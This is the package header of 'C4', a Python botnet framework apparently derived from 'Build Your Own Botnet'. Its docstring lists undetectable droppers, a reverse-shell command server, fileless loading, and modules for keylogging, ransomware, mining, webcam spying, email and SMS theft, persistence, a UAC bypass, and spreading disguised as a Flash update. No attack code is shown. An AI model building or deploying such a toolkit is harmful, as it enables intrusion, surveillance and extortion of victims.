#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Build Your Own Botnet

C4 is an open-source project that provides a library of packages
and modules which provide a basic framework for security researchers and
developers looking to roll-up their sleeves and get some hands-on experience
defending networks against a simulated botnet roll-out with realistic droppers
that will test the limits of your capacity to defend your network

The library contains 4 main parts:

C4.client
  generates unique, virtually undetectable droppers with staged payloads
  and a number of optional features can be added via intuitive command-line
  arguments, such as: --host, --port, --obfuscate, --compile, --compress, --encrypt
  (see `client.py -h/--help` for detailed usage information)

C4.server
  console based command & control server with a persistent database for
  managing the client's reverse TCP shell sessions, tracking tasks issued
  to each client, storing results of each client's completed tasks, as well
  as hosting the C4.remote package online for clients to access remotely

C4.core
  supackage containing the core modules used by the server

  C4.core.util
    miscellaneous utility functions that are used by many modules

  C4.core.handler
    HTTP POST request handler for receiving client file uploads

  C4.core.security
    module containing the Diffie-Hellman Internet Key Exchange (RFC 2741)
    method for securing a shared secret key even over insecure networks,
    as well as encryption & decryption methods for 2 different modes:
     - AES-256-CBC
     - XOR-128

  C4.core.loader
    enables clients to remotely import any package/module/script from the server
    by requesting the code from the server, loading the code in-memory, where
    it can be directly imported into the currently running process, without
    writing anything to the disk (not even temporary files - zero IO system calls)

  C4.core.payload
    reverse TCP shell designed to remotely import cyber-security modules from
    server, along with any packages/dependencies), complete tasks issued by
    the server, and handles connections & communication at the socket-level

  C4.core.generators
    module containing functions which all generate code by using the arguments
    given to complete templates of varying size and complexity, and then output
    the code snippets generated as raw text

C4.modules
  add any scripts/modules you want to run on target machines to this directory.
  While the server is online, clients will automatically be able to
  remotely import them into the currently running process without writing anything
  to the disk, and use them directly without installation.

  C4.modules.miner
    run a Bitcoin miner in the background

  C4.modules.keylogger
    logs the user’s keystrokes & the window name entered

  C4.modules.screenshot
    take a screenshot of current user’s desktop

  C4.modules.webcam
    view a live stream or capture image/video from the webcam

  C4.modules.ransom
    encrypt files & generate random BTC wallet for ransom payment

  C4.modules.icloud
    check for logged in iCloud account on macOS

  C4.modules.outlook
    read/search/upload emails from the local Outlook client

  C4.modules.packetsniffer
    run a packet sniffer on the host network & upload .pcap file

  C4.modules.persistence
    establish persistence on the host machine using multiple methods
     - launch agent   (Mac OS X)
     - scheduled task (Windows)
     - startup file   (Windows)
     - registry key   (Windows)
     - crontab job    (Linux)

  C4.modules.phone
    read/search/upload text messages from the client smartphone

  C4.modules.escalate
    (Windows) attempt UAC bypass to gain unauthorized administrator privileges

  C4.modules.portscanner
    scan the local network for other online devices & open ports

  C4.modules.process
    list/search/kill/monitor currently running processes on the host

  C4.modules.spreader
    spread client to other hosts via email disguised as 'Adobe Flash Player Update'

  C4.modules.payloads
    package containing the payloads created by client generator that are being
    hosted locally by the server (rather than uploaded to Pastebin to be hosted
    there anonymously) for the client stagers to load & execute on the target
    host machines

  C4.modules.stagers
    package containing payload stagers created by the client generator along
    with the main payloads, which are hosted locally by the server (rather
    than uploaded to Pastebin to be hosted there anonymously) for the client
    droppers to load & execute on target host machines"""

__all__ = ['client','core','modules','server']
__version__ = '1.0'
__license__ = 'GPLv3'
__github__ = 'https://github.com/lance0145/C4'

def main():
    for module in __all__:
        exec("import {}".format(module))

#main()
